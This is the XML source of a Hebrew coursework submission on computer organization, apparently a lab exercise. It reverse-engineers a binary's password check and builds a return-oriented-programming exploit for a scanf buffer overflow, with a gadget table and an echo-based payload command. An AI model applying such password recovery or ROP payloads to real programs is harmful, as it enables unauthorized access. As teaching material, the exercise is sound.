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in" fo:margin-left="0.5694in" fo:margin-top="0in" fo:margin-bottom="0in" fo:break-before="auto" fo:break-after="auto" table:align="left" style:writing-mode="rl-tb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1">
      <style:paragraph-properties fo:margin-left="0.5in" fo:margin-right="0in" fo:text-align="end" style:justify-single-word="false" fo:text-indent="-0.25in" style:auto-text-indent="false" style:writing-mode="rl-tb"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum2">
      <style:paragraph-properties fo:margin-left="0.5in" fo:margin-right="0in" fo:text-align="end" style:justify-single-word="false" fo:text-indent="-0.25in" style:auto-text-indent="false" style:writing-mode="rl-tb"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum2">
      <style:paragraph-properties fo:margin-left="0.5in" fo:margin-right="0in" fo:text-align="end" style:justify-single-word="false" fo:text-indent="-0.25in" style:auto-text-indent="false" style:writing-mode="rl-tb"/>
      <style:text-properties style:text-underline-style="none"/>
    </style:style>
    <style:style style:name="P5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 style:writing-mode="rl-tb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 style:list-style-name="WWNum2">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false" style:writing-mode="lr-tb"/>
      <style:text-properties officeooo:paragraph-rsid="001547eb"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum2">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false" style:writing-mode="lr-tb"/>
      <style:text-properties officeooo:paragraph-rsid="001b1421"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum2">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false" style:writing-mode="lr-tb"/>
      <style:text-properties officeooo:rsid="00178109" officeooo:paragraph-rsid="0016e948"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:paragraph-properties fo:text-align="end" style:justify-single-word="false" style:writing-mode="rl-tb"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:paragraph-properties fo:text-align="end" style:justify-single-word="false" fo:break-before="page" style:writing-mode="rl-tb"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Title" style:master-page-name="Standard">
      <style:paragraph-properties fo:text-align="end" style:justify-single-word="false" style:page-number="1" style:writing-mode="rl-tb"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:text-underline-style="none"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00101fb3"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="001328dd"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00147392"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="001547eb"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="0016e948"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="00178109"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="00193f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s5dxeym2rlha"/>ארגון ותכנות המחשב – תרגיל בית 3</text:p>
      <text:p text:style-name="P13"><text:bookmark text:name="_g4aafpmf8eer"/>שאלה 1</text:p>
      <text:list xml:id="list887415172" text:style-name="WWNum1">
        <text:list-item>
          <text:p text:style-name="P2">מוגדרים ב-prog תשעה program headers.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">ישנם שני headers מסוג LOAD, במקומות 02 ו-03 ב-program headers.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P5">02:</text:p>
      <text:p text:style-name="P6">Offset: 0</text:p>
      <text:p text:style-name="P6">Memory location: 400000x0</text:p>
      <text:p text:style-name="P6">File size: 1864</text:p>
      <text:p text:style-name="P6">Memory size: 1864</text:p>
      <text:p text:style-name="P6">Flags: Read, Execute</text:p>
      <text:p text:style-name="P5">03:</text:p>
      <text:p text:style-name="P6">Offset: 1e10x0</text:p>
      <text:p text:style-name="P6">Memory location: 601e10x0</text:p>
      <text:p text:style-name="P6">File size: 22c</text:p>
      <text:p text:style-name="P6">Memory size: 230</text:p>
      <text:p text:style-name="P6">Flags: Read, Write</text:p>
      <text:list xml:id="list84258449148930" text:continue-numbering="true" text:style-name="WWNum1">
        <text:list-item>
          <text:p text:style-name="P2">בתחילת ריצת התוכנית תוכן הזיכרון ב-401234x0 הוא חלק מ-section 02. משום שה-offset שלו הוא 0, מדובר בבית שבמקום ה-1234 מתחילת התוכנית. מ-hexdump נסיק שזהו "c7"</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">מאותם השיקולים כמו בסעיף 3, נקבל כי</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6">Char foo[26] = {0x63,0x66,0x6d,0x61,0x79,0x67,0x74,0x75,0x72,0x73,0x78,0x6c,0x70,0x6f,0x64,0x71,0x65,0x7a,0x6e,0x77,0x69,0x6b,0x68,0x6a,0x62,0x76}</text:p>
      <text:list xml:id="list84259313825155" text:continue-numbering="true" text:style-name="WWNum1">
        <text:list-item>
          <text:p text:style-name="P2">מאותם השיקולים כמו בסעיף 3, נקבל כי</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6">Char bar[11]={0x0f,0x07,0x14,0x12,0x06,0x14,0x0b,0x0b,0x14,0x0d,0x12}</text:p>
      <text:list xml:id="list84258735501312" text:continue-numbering="true" text:style-name="WWNum1">
        <text:list-item>
          <text:p text:style-name="P2">נתבונן ב-symtable ונראה כי check_password מופיע במקום 4005f0x0 בזיכרון. מאותם השיקולים כמו בסעיף 3, נתבונן ב-disassembly של הקובץ החל משורה 0x5f, ונשלים את הפונקציה בהתאם:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6">int check_passwoed(char* s){</text:p>
      <text:p text:style-name="P6"><text:tab/>int i;</text:p>
      <text:p text:style-name="P6"><text:tab/>for (i=0;i&lt;11;i++){</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/>if s[i]!=foo[bar[i]]{</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>return 0;</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/>}</text:p>
      <text:p text:style-name="P6"><text:tab/>}</text:p>
      <text:p text:style-name="P6"><text:tab/>return s[11]==0;</text:p>
      <text:p text:style-name="P6">}</text:p>
      <text:list xml:id="list84259301626306" text:continue-numbering="true" text:style-name="WWNum1">
        <text:list-item>
          <text:p text:style-name="P2">מעקב אחרי האינדקסים המתאימים לפונקציה בזיכרון יחשוף את הסיסמה הנכספת: quintillion</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P14"><text:bookmark text:name="_oa0v9npmkewy"/>שאלה 2</text:p>
      <text:list xml:id="list261894945" text:style-name="WWNum2">
        <text:list-item>
          <text:p text:style-name="P3">קריאה ל-scanf ללא הגבלה על מס' התווים אותו נוכל להכניס, מאפשרת לנו להכניס לזיכרון מידע שרירותי שיאפשר למשתמש לשנות את התנהגות התוכנית, בטעות או בזדון.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3">מהסתכלות ב-gdb נראה כי אחרי הכנסת הקלט הלא תקין, פקודת ret תקפוץ לכתובת 0x3435363738396162. זאת משום ש-main מעבירה ל-scanf את הכתובת הנוכחית של rsp, שנמצאת מתחת למיקום של כתובת החזרה במחסנית.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"/>
        </text:list-item>
      </text:list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8">מיקום</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P8">קידוד</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P8">פקודות</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Table1.1">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0x401663</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">5f c3 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">pop %rdi </text:p>
            <text:p text:style-name="P9">ret</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Table1.1">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0x4015fe</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">58 c3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P1">pop %rax</text:p>
            <text:p text:style-name="P9">ret</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Table1.1">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0x400e9d</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0f 05</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">syscall</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Table1.1">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0x4008ed</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">54 24 08 FF d7 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">push %rsp</text:p>
            <text:p text:style-name="P9">and $8, %al</text:p>
            <text:p text:style-name="P9">call* %rdi</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Table1.1">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0x4007a6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">5e 5f 5d c3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">pop %rsi</text:p>
            <text:p text:style-name="P9">pop %rdi</text:p>
            <text:p text:style-name="P9">pop %rbp</text:p>
            <text:p text:style-name="P9">ret</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Table1.1">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0x40083<text:span text:style-name="T8">4</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9"><text:span text:style-name="T8">ff </text:span>cf c3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">dec %rdi</text:p>
            <text:p text:style-name="P9">ret</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Table1.1">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">0x401661</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P9">5e 41 57 c3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P1">pop %rsi</text:p>
            <text:p text:style-name="P9">pop %r15</text:p>
            <text:p text:style-name="P9">ret</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P7"/>
      <text:list xml:id="list84259701909936" text:continue-numbering="true" text:style-name="WWNum2">
        <text:list-item>
          <text:p text:style-name="P11"><text:s/>echo -e "my_first_exploit\x00ihgfedc\x63\x16\x40\x00\x00\x00\x00\x00\xa6\x07\x40\x00\x00\x00\x00\x00\xed\x08\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x61\x16\x40\x00\x00\x00\x00\x00\xed\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\x15\x40\x00\x00\x00\x00\x00\x53\x00\x0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<text:soft-page-break/>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9d\x0e\x40\x00\x00\x00\x00\x00\x00" &gt; temp_jum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6T08:42:57.516280281</dc:date>
    <meta:editing-duration>PT1M19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3" meta:paragraph-count="71" meta:word-count="285" meta:character-count="3651" meta:non-whitespace-character-count="3431"/>
  </office:meta>
</office:document-meta>
</file>